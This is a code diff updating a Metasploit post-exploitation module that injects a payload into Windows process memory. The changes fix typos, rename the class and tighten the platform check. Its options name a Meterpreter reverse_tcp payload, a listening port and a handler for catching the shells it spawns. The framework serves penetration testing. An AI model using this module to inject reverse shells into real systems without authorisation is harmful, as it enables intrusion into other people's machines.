@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
 
   def initialize(info={})
@@ -30,21 +27,21 @@ class Metasploit3 < Msf::Post
       [
         OptString.new('PAYLOAD', [false, 'Payload to inject in to process memory', "windows/meterpreter/reverse_tcp"]),
         OptInt.new('LPORT',      [false, 'Port number for the payload LPORT variable.', 4444]),
-        OptString.new('IPLIST',  [true, 'List of semicolom separated IP list.', Rex::Socket.source_address("1.2.3.4")]),
-        OptString.new('PIDLIST', [false, 'List of semicolom separated PID list.', '']),
-        OptBool.new('HANDLER',   [false, 'Start new multi/handler job on local box.', false]),
+        OptString.new('IPLIST',  [true, 'List of semicolon separated IP list.', Rex::Socket.source_address("1.2.3.4")]),
+        OptString.new('PIDLIST', [false, 'List of semicolon separated PID list.', '']),
+        OptBool.new('HANDLER',   [false, 'Start new exploit/multi/handler job on local box.', false]),
         OptInt.new('AMOUNT',     [false, 'Select the amount of shells you want to spawn.', 1])
-      ], self.class)
+      ])
 
     register_advanced_options(
       [
         OptString.new('PROCESSNAME', [false, 'Description', 'notepad.exe'])
-      ],self.class)
+      ])
   end
 
   # Run Method for when run command is issued
   def run
-    unless client.platform =~ /win/
+    unless session.platform == 'windows' && [ARCH_X64, ARCH_X86].include?(session.arch)
       print_error("This module requires native Windows meterpreter functions not compatible with the selected session")
       return
     end
@@ -117,7 +114,7 @@ class Metasploit3 < Msf::Post
       'Payload'        => mul.datastore['PAYLOAD'],
       'RunAsJob'       => true
     )
-    print_good("Multi/Handler started!")
+    print_good("exploit/multi/handler started!")
   end
 
   # Function for Creating the Payload
